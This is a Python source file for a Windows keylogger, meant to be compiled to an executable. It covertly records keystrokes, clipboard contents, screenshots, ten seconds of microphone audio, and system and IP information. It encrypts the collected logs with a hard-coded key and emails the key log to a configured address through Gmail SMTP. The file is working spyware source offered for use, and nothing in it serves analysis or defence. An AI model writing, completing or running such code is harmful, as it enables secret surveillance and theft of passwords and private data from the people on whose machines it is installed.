
##basic keylogger w/screenshot, system info(Public/private IP), microphone recording, clipboard copy. Email a copy of files every certain ammount of time.. 
# 
#  convert to executable. 

#imports

import socket
import platform

import pathlib
import cv2

from cryptography.fernet import Fernet

import time
import os
import win32clipboard

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

from pynput.keyboard import Key, Listener


from scipy.io.wavfile import write
import sounddevice as sd

#Email
from email.mime.multipart import MIMEMultipart      # Encodes ['From'], ['To'], and ['Subject']
from email.mime.text import MIMEText                # Sending text emails
from email.mime.base import MIMEBase                # Adds a Content-Type header
from email import encoders
import smtplib                                      #Defines SMTP client session object
import re

#CODE START
screenshot_information = "screenshot.png"

keys_information = "key_log.txt"

system_information = "syseminfo.txt"

audio_information = "audio.wav"

clipboard_information = "clipboard.txt"

file_path = "C:\\Users\\Desktop\\keylogs\\basicLogs"
extend = "\\"
file_merge = file_path + extend

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

key = "1oHMgDGUlJi8go2nfcnKsHrQStpPrPu-GF10ftqjhEA="

email_address = "email address"
password = "password"
toaddr = "email address"

microphone_time = 10


time_iteration = 15
number_of_iterations_end = 3



def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com:587')

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr)

#computer Info
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

#clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()


#microphone recording.
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

microphone()

#Screenshots
def screenshot():
        im = ImageGrab.grab()
        im.save(file_path + extend + screenshot_information)

screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration




#Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    def on_press(key):
        global keys, count

        keys.append(key)
        count += 1
        print("{0} pressed".format(key))

        if count >= 10:
            count = 0
            write_file(keys)
            keys = []
        
    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    

    with Listener(on_press =on_press, on_release =on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w" ) as f:
            f.write (" ")

        screenshot()

        copy_clipboard()
    
    
   
        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration





#Encrypt Files

files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    
    count += 1

time.sleep(120)

